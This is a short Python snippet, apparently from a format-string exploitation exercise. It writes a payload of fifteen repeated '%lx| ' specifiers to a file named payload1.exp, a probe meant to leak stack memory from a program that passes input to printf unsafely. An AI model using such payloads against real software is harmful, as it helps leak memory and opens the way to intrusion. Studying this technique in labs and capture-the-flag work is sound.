payload = b"%lx| "*15

exp_file_name = "payload1.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()
